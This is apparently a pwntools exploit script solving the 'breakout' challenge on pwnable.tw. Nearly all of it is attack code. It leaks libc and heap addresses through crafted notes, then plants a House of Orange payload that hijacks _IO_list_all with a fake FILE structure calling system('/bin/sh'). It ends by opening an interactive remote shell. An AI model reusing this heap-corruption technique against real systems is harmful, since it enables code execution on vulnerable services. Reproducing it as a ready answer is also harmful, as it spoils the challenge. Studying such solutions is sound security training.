from pwn import *

#Use -> house_of_orange technic!!
context.log_level='debug'

'''
Prisoner struct
0x56287f896c10:	0x0000000000000000		0x0000000000000051
0x56287f896c20:	0x000056287dfcac28->Risk	0x000056287f896ce0-> name
0x56287f896c30:	0x000056287f896d00->()  	0x00000004 -> cell 00000028-> age
0x56287f896c40:	0x000056287f896d20->sentence	0x0000000000000008-> note size
0x56287f896c50:	0x000056287f8970f0->note	0x0000000000000000->next prisoner structer
'''
def list_(until=False):
	s.recvuntil('> ')
	s.sendline('list')

	if until is not False:
		s.recvuntil(until)

def note(cell,size,data):
	s.recvuntil('> ')
	s.sendline('note')
	s.recvuntil('Cell: ')
	s.sendline(str(cell))
	s.recvuntil('Size: ')
	s.sendline(str(size))
	s.recvuntil('Note: ')
	s.send(data)

def punish(cell):
	s.recvuntil('> ')
	s.sendline('punish')
	s.recvuntil('Cell: ')
	s.sendline(str(cell))

if __name__ == "__main__":

	'''
	typedef struct prisoner_s {
    		const char *risk;
    		char *name;
    		char *aka;
    		uint32_t age;
    		uint32_t cell;
		char *sentence;
   	 	uint32_t note_size;
		char *note;
		struct prisoner_s *next;
	} Prisoner;
	'''

	elf="./breakout"
	#libc="/lib/x86_64-linux-gnu/libc.so.6"
	libc="./libc.so.6" #server
	#s=process(elf)
	#s=process(elf,env={'LD_PRELOAD':'./libc.so.6'})
	s=remote('chall.pwnable.tw',10400)

	e=ELF(elf)
	l=ELF(libc)

        note(0,100,'A')
        note(1,100,'B')
        note(2,100,'C')
        note(3,100,'D')
        note(0,200,'a')
        note(2,200,'c')
	note(8,0x200,'8')	

        note(9,100,'9') #heap address leak from fastbin 
	
	note(0,0x150,'0'*0x150)
	note(2,0x200,'2')

	note(5,0x80,'q'*0x8)

	list_(until='q'*0x8)
	libc_leak=u64(s.recv(6).ljust(8,'\x00'))
	libc_base=libc_leak-0x3c4d08+0x1000
	list_(until="Sentence: Life imprisonment, guilty for more than 26 contract kills\nNote: ")
	heap_leak=u64(s.recv(6).ljust(8,'\x00'))
	heap_base=heap_leak-0x12439

	system =libc_base+l.symbols['system']
	_IO_list_all=libc_base+l.symbols['_IO_list_all']

	note(8,0x1000,'Make_unsortedbin!!')
	punish(0)

	payload=p64(0xffffffffffffffff)+p64(heap_base+0x11ce0)+p64(heap_base+0x11d00)
	payload+=p32(0x28)+p32(0x0)
	payload+=p64(heap_base+0x11d20)
	payload+=p64(0x1000)
	payload+=p64(heap_base+0x12680)#sentence -> unsorted bin
	note(7,0x40,payload)

	payload="/bin/sh\x00"+p64(0x61) #top top[1]
	
	payload+=p64(_IO_list_all-0x9a8)+p64(_IO_list_all-0x10) #top[2] top[3]
	payload+=p64(0x0)+p64(0x0) #top[4] top[5]
	payload+=p64(0x0)+p64(0x0) #top[6] top[7]
	payload+=p64(0x0)+p64(0x0) #top[8] top[9]
	payload+=p64(0x0)+p64(0x0) #top[10] top[11]
	payload+=p64(0x0)+p64(0x0) #top[12] top[13]
        payload+=p64(0x0)+p64(system) #top[14] top[15]
        payload+=p64(0x0)+p64(0x0) #top[16] top[17]
        payload+=p64(0x0)+p64(0x0) #top[18] top[19]
        payload+=p64(heap_base+0x12710)+p64(0x2) #top[20] top[21]
	payload+=p64(0x3)+p64(0x0) #top[22] top[23]
	payload+=p64(0x1)+p64(0x0) #top[24] top[25]
	payload+=p64(0x0)+p64(heap_base+0x126e0) #top[26] top[27]

	note(0,len(payload),payload)
		
	print "Heap base address : "+str(hex(heap_base))
	print "Libc base address : "+str(hex(libc_base))


	#exploit!!!	
	s.recvuntil('>')
	s.sendline('note')
	s.recvuntil('Cell: ')
	s.sendline('6')
	s.sendline('30')

	s.interactive()

